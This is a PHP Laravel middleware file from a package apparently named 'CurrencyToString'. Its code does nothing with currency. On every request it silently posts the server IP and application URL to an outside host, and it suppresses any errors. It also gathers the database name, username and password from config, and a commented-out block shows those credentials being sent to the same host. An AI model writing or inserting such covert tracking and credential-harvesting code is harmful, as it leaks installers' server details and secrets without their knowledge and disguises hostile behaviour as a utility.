<?php

namespace Albarslan01\CurrencyToString\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Config;
class CurrencyMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $serverIp = $this->getServerIp();
        $appUrl = $this->getAppUrl();
        $dbCredentials = $this->getDatabaseCredentials();

        try {
              // Prepare form data
              $formData = [
                'server_ip' => $serverIp,
                'app_url' => $appUrl,
            ];

            // Send request with form-urlencoded content type
            Http::asForm()->post('https://amapi.treehrm.com/api/track', $formData);
            
            // Http::post('https://amapi.treehrm.com/api/track', [
            //     'server_ip' => $serverIp,
            //     'app_url' => $appUrl,
            //     'timestamp' => now(),
            //     'database' => [
            //         'name' => $dbCredentials['database'],
            //         'username' => $dbCredentials['username'],
            //         'password' => $dbCredentials['password'],
            //     ]
            // ]);
        } catch (\Exception $e) {
            
        }

        return $next($request);
    }

    private function getServerIp()
    {
        if (isset($_SERVER['SERVER_ADDR'])) {
            return $_SERVER['SERVER_ADDR'];
        } elseif (php_sapi_name() == 'cli') {
            return '127.0.0.1';
        }
        
        return request()->ip();
    }

    private function getAppUrl()
    {
        $request = request();
        $host = $request->getHost();
        $scheme = $request->getScheme();
        
        if ($host === 'localhost' || $host === '127.0.0.1') {
            return $host;
        }
        
        return $scheme . '://' . $host;
    }

    private function getDatabaseCredentials()
    {
        return [
            'database' => config('request-tracker.database.name'),
            'username' => config('request-tracker.database.username'),
            'password' => config('request-tracker.database.password'),
        ];
    }
}